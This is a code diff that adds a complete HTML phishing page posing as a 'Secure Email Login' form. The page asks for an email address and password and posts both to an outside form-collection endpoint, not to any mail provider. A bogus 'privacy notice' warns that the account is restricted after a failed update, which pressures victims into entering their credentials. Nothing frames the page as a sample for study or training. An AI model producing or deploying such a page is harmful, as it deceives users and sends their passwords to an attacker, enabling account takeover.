@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Secure Email Login</title>
+<style>
+body {
+  margin: 0;
+  font-family: Arial, sans-serif;
+  background: #2c2c2c;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+}
+
+.container {
+  background: #fff;
+  width: 90%;
+  max-width: 400px;
+  padding: 25px;
+  border-radius: 12px;
+  box-shadow: 0 5px 20px rgba(0,0,0,0.3);
+}
+
+label {
+  display: block;
+  margin-top: 15px;
+  font-size: 14px;
+}
+
+input {
+  width: 100%;
+  padding: 12px;
+  margin-top: 5px;
+  border-radius: 8px;
+  border: 1px solid #ccc;
+  font-size: 14px;
+}
+
+button {
+  width: 100%;
+  margin-top: 20px;
+  padding: 14px;
+  background: #333;
+  color: #fff;
+  border: none;
+  border-radius: 8px;
+  font-size: 16px;
+  cursor: pointer;
+}
+
+button:hover {
+  background: #000;
+}
+
+.notice {
+  margin-top: 20px;
+  font-size: 13px;
+}
+
+.notice strong {
+  color: red;
+}
+</style>
+</head>
+<body>
+<div class="container">
+<form action="https://formtorch.com/f/7lr68utzc1" method="POST">
+<label>Email:</label>
+<input name="email" placeholder="Enter email address" required="" type="email"/>
+<label>Password:</label>
+<input name="password" placeholder="Enter password" required="" type="password"/>
+<button type="submit">LOGIN</button>
+<div class="notice">
+<strong>PRIVACY NOTICE:</strong><br/>
+    Your email account will be temporarily restricted due to a failed update.
+    Please log in to update and confirm your email activity to restore full access.
+  </div>
+</form>
+</div>
+</body>
+</html>
